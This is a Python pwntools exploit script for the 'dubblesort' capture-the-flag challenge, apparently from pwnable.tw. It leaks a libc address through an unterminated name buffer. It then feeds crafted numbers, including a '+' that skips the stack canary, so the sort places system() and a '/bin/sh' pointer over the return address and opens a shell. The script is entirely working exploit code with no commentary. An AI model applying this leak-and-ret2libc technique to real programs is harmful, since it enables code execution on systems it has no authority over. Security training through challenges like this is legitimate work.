from pwn import *
context(arch='i386',log_level='debug')
p=process("./dubblesort")
libc = ELF('./libc_32.so.6')
p=process("./dubblesort",env={"LD_PRELOAD":"./libc_32.so.6"})
# p=remote("chall.pwnable.tw",10101)
# nc chall.pwnable.tw 10101
p.recvuntil(':')
# sys_offset=0x3da0
# sh_offset=1423883
# libcbase=
p.sendline('a'*24)
result=p.recvuntil('How many')
# gdb.attach(p,"b *0x56555a4d\n c")
result='\x00'+result[31:34]
libcbase=u32(result)-0x1b0000
print "libc is in"+hex(libcbase)
sys=libcbase+libc.symbols['system']
sh=libcbase+ 0x158e8b
p.sendlineafter(':','35')
for i in range(24):
	p.sendlineafter(':','0')
p.sendlineafter(':','+')
for i in range(7):
	p.sendlineafter(':',str(sys-1))
p.sendlineafter(':',str(sys))
p.sendlineafter(':',str(sh-1))
p.sendlineafter(':',str(sh))

# p.recv()

# p.send(shellcode)
p.interactive()